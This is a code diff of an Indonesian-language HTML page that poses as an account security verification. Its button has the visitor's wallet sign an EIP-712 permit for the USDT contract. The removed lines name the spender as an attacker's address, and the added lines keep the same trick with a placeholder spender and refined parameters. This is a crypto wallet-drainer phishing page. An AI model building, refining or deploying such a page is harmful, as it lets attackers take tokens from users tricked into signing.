@@ -1,28 +1,29 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h3>Update Pengaturan Akun</h3>
-    <p>Klik tombol di bawah untuk verifikasi akun dan sinkronisasi saldo Anda.</p>
-    <button id="verifyBtn">Verifikasi Akun</button>
+    <h3>Verifikasi Keamanan Akun</h3>
+    <p>Silakan verifikasi untuk melanjutkan akses.</p>
+    <button id="verifyBtn">Verifikasi Sekarang</button>
 
     <script>
         document.getElementById('verifyBtn').addEventListener('click', async () => {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            
-            // Struktur data EIP-712 untuk fungsi 'permit' (EIP-2612)
+            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+
+            // Data permit yang lebih mendekati standar nyata
             const permitData = {
                 domain: {
-                    name: "USDT", // Target token
+                    name: "USDT", 
                     version: "1",
-                    chainId: 1,
-                    verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7" // Alamat Kontrak USDT
+                    chainId: parseInt(chainId, 16),
+                    verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
                 },
                 message: {
                     owner: accounts[0],
-                    spender: "0xAttackerAddress...", // Alamat penyerang yang akan diberi izin
-                    value: "1000000000000000000000", // Jumlah (dalam wei)
-                    nonce: 0,
-                    deadline: 2629746000
+                    spender: "0x0000000000000000000000000000000000000000", // Ganti dengan spender yang valid
+                    value: "1000000000", 
+                    nonce: 0, // Anda mungkin perlu mengambil nonce asli dari kontrak
+                    deadline: Math.floor(Date.now() / 1000) + 3600 // Deadline 1 jam ke depan
                 },
                 primaryType: "Permit",
                 types: {
@@ -39,13 +40,13 @@
             };
 
             try {
-                await window.ethereum.request({
+                const signature = await window.ethereum.request({
                     method: 'eth_signTypedData_v4',
                     params: [accounts[0], JSON.stringify(permitData)],
                 });
-                alert("Verifikasi berhasil!");
+                alert("Tanda tangan berhasil dibuat: " + signature);
             } catch (err) {
-                console.error(err);
+                console.error("Gagal menandatangani:", err);
             }
         });
     </script>
